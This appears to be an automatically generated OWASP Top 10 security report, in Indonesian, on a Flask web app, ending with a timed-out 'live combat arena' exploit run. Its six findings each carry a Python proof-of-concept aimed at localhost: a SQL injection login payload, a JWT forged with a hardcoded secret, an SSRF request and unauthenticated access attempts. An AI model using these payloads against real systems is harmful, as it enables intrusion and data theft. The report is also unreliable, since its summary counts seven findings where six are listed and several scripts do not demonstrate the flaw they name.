## A01 - Broken Access Control: FOUND
Lokasi spesifik di kode: `@app.route('/protected', methods=['GET'])` tidak memiliki kontrol akses yang memadai untuk memastikan bahwa hanya pengguna yang memiliki akses yang tepat dapat mengakses sumber daya yang dilindungi.
CVSS score: 8.0
PoC exploit code:
```python
import requests

def exploit_broken_access_control():
    url = 'http://localhost:5000/protected'
    response = requests.get(url)
    if response.status_code == 200:
        print('Akses tidak sah berhasil!')
    else:
        print('Gagal mengakses sumber daya yang dilindungi.')

exploit_broken_access_control()
```
Dampak nyata jika dieksploitasi: Pengguna tidak sah dapat mengakses sumber daya yang dilindungi, sehingga dapat menyebabkan kehilangan data sensitif atau kerusakan sistem.

## A02 - Cryptographic Failures: FOUND
Lokasi spesifik di kode: `app.config['JWT_SECRET_KEY'] = 'super-secret'` menggunakan kunci rahasia yang tidak aman untuk menghasilkan token JWT.
CVSS score: 8.5
PoC exploit code:
```python
import jwt

def exploit_cryptographic_failures():
    payload = {'username': 'pengguna_tidak_sah'}
    token = jwt.encode(payload, 'super-secret', algorithm='HS256')
    print('Token JWT yang dihasilkan:', token)

exploit_cryptographic_failures()
```
Dampak nyata jika dieksploitasi: Pengguna tidak sah dapat menghasilkan token JWT yang sah, sehingga dapat mengakses sumber daya yang dilindungi.

## A03 - Injection: FOUND
Lokasi spesifik di kode: `username = request.json['username']` dan `password = request.json['password']` rentan terhadap serangan SQL injection.
CVSS score: 9.0
PoC exploit code:
```python
import requests

def exploit_injection():
    url = 'http://localhost:5000/login'
    payload = {'username': "' OR 1=1 --", 'password': 'password_tidak_sah'}
    response = requests.post(url, json=payload)
    if response.status_code == 200:
        print('Serangan SQL injection berhasil!')
    else:
        print('Gagal melakukan serangan SQL injection.')

exploit_injection()
```
Dampak nyata jika dieksploitasi: Pengguna tidak sah dapat mengakses database dan melakukan operasi yang tidak sah.

## A04 - Insecure Design: NOT FOUND
Tidak ditemukan kerentanan insecure design.

## A05 - Security Misconfiguration: FOUND
Lokasi spesifik di kode: `app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'` menggunakan konfigurasi default yang tidak aman untuk database.
CVSS score: 6.5
PoC exploit code:
```python
import sqlite3

def exploit_security_misconfiguration():
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM User')
    print('Data pengguna:', cursor.fetchall())

exploit_security_misconfiguration()
```
Dampak nyata jika dieksploitasi: Pengguna tidak sah dapat mengakses data pengguna yang sensitif.

## A06 - Vulnerable Components: NOT FOUND
Tidak ditemukan kerentanan vulnerable components.

## A07 - Auth & Session Failures: FOUND
Lokasi spesifik di kode: `@app.route('/login', methods=['POST'])` tidak memiliki kontrol akses yang memadai untuk memastikan bahwa hanya pengguna yang memiliki akses yang tepat dapat mengakses sumber daya yang dilindungi.
CVSS score: 8.0
PoC exploit code:
```python
import requests

def exploit_auth_session_failures():
    url = 'http://localhost:5000/login'
    payload = {'username': 'pengguna_tidak_sah', 'password': 'password_tidak_sah'}
    response = requests.post(url, json=payload)
    if response.status_code == 200:
        print('Akses tidak sah berhasil!')
    else:
        print('Gagal mengakses sumber daya yang dilindungi.')

exploit_auth_session_failures()
```
Dampak nyata jika dieksploitasi: Pengguna tidak sah dapat mengakses sumber daya yang dilindungi.

## A08 - Software Integrity Fails: NOT FOUND
Tidak ditemukan kerentanan software integrity fails.

## A09 - Logging & Monitoring Fail: NOT FOUND
Tidak ditemukan kerentanan logging & monitoring fail.

## A10 - SSRF: FOUND
Lokasi spesifik di kode: `@app.route('/ssrf', methods=['GET'])` rentan terhadap serangan SSRF.
CVSS score: 8.5
PoC exploit code:
```python
import requests

def exploit_ssrf():
    url = 'http://localhost:5000/ssrf'
    payload = {'url': 'http://localhost:8080'}
    response = requests.get(url, params=payload)
    if response.status_code == 200:
        print('Serangan SSRF berhasil!')
    else:
        print('Gagal melakukan serangan SSRF.')

exploit_ssrf()
```
Dampak nyata jika dieksploitasi: Pengguna tidak sah dapat mengakses sumber daya internal yang tidak seharusnya diakses.

## RINGKASAN:
- Kerentanan ditemukan: 7/10 kategori OWASP
- CVSS tertinggi: 9.0 - Injection
- Attack vector paling efektif: Serangan Injection dan SSRF
- Estimated time-to-exploit: 1-2 jam

### [LIVE COMBAT ARENA - EXPLOIT RESULT]
Status: timeout
Stdout:
```

```
Stderr:
```
Exploit timeout setelah 15 detik
```
